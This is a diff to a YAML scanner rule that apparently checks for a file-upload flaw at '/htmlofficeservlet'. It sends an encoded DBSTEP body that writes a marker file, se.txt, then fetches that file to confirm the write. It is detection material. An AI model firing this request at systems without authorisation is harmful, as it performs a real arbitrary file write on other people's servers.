@@ -3,43 +3,16 @@ rules:
   - method: POST
     path: /htmlofficeservlet
     headers:
-      User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-      Pragma: no-cache
       Content-Type: 1
-    body: >-
-      DBSTEP V3.0     355             0               666            
-      DBSTEP=OKMLlKlV
-
-      OPTION=S3WYOSWLBSGr
-
-      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
-
-      CREATEDATE=wUghPB3szB3Xwg66
-
-      RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
-
-      originalFileId=wV66
-
-      originalCreateDate=wUghPB3szB3Xwg66
-
-      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddAS5NrJ3
-
-      needReadFile=yRWZdAS6
-
-      originalCreateDate=wLSGP4oEzLKAz4=iz=66
-
-      a6e4f045d4b8506bf492ada7e3390d7ce
+    body: "DBSTEP V3.0     355             0               666            \r\nDBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddAS5NrJ3\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\na6e4f045d4b8506bf492ada7e3390d7ce"
     follow_redirects: false
     expression: |
       status == 200
   - method: GET
     path: /se.txt
-    headers:
-      User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
-      Pragma: no-cache
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(b'd4b8506bf492ada7e3390d7ce')
+      status == 200 && body.bcontains(b'da7e3390d7ce')
 
 detail:
     author: timwhite
